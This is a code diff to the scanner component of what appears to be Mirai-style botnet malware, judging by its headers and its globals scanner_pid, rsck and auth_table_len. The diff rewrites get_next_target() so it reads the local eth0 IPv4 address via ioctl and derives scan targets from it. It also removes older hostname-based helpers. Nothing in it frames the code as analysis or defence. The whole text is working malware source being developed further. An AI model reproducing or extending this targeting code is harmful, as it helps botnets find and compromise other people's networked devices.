@@ -19,6 +19,10 @@
 #include <linux/ip.h>
 #include <linux/tcp.h>
 
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <net/if.h>
+
 #include "includes.h"
 #include "scanner.h"
 #include "table.h"
@@ -26,87 +30,27 @@
 #include "util.h"
 #include "checksum.h"
 #include "resolv.h"
+#include "const.h"
 
-// Returns hostname for the local computer 
-int checkHostName(int hostname) 
-{ 
-    if (hostname == -1) 
-    {
-        return 0; 
-    }
-    return 1;
-} 
-  
-// Returns host information corresponding to host name 
-int checkHostEntry(struct hostent * hostentry) 
-{ 
-    if (hostentry == NULL) 
-    { 
-        return 0;
-    } 
-    return 1;
-} 
-  
-// Converts space-delimited IPv4 addresses 
-// to dotted-decimal format 
-int checkIPbuffer(char *IPbuffer) 
-{ 
-    if (NULL == IPbuffer) 
-    { 
-        return 0;
-    } 
-    return 1;
-}
-
-// Driver code 
 ipv4_t get_next_target(void) 
 { 
-    static int order = 0;
-    char hostbuffer[256]; 
-    char *IPbuffer; 
-    struct hostent *host_entry; 
-    int hostname; 
-    ipv4_t *p_host_ip;
-    ipv4_t return_ip;
-  
-    // To retrieve hostname 
-    hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
-    if(0 == checkHostName(hostname))
-    {
-        return 0;
-    }
-  
-    // To retrieve host information 
-    host_entry = gethostbyname(hostbuffer); 
-    if(0 == checkHostEntry(host_entry))
-    {
-        return 0;
-    }
-  
-    // To convert an Internet network 
-    // address into ASCII string
-    /* 
-    IPbuffer = inet_ntoa(*((struct in_addr*) 
-                           host_entry->h_addr_list[0])); 
-  
-    printf("Hostname: %s\n", hostbuffer); 
-    printf("Host IP: %s", IPbuffer); 
-    */
+    int fd;
+    struct ifreq ifr;
 
-    p_host_ip = host_entry->h_addr_list[order];
-    if(p_host_ip == NULL)
-    {
-        order = 0;
-        return 0;
-    }
-    else
-    {
-        order++;
-    }
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
 
-    return_ip = *p_host_ip | (1 << 24)
-  
-    return return_ip; 
+    /* I want to get an IPv4 IP address */
+    ifr.ifr_addr.sa_family = AF_INET;
+
+    /* I want IP address attached to "eth0" */
+    strncpy(ifr.ifr_name, NETWORK_INTERFACE, IFNAMSIZ-1);
+
+    ioctl(fd, SIOCGIFADDR, &ifr);
+
+    close(fd);
+
+    /* display result */
+    return ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr | (1 << 24);
 } 
 
 int scanner_pid, rsck, rsck_out, auth_table_len = 0;
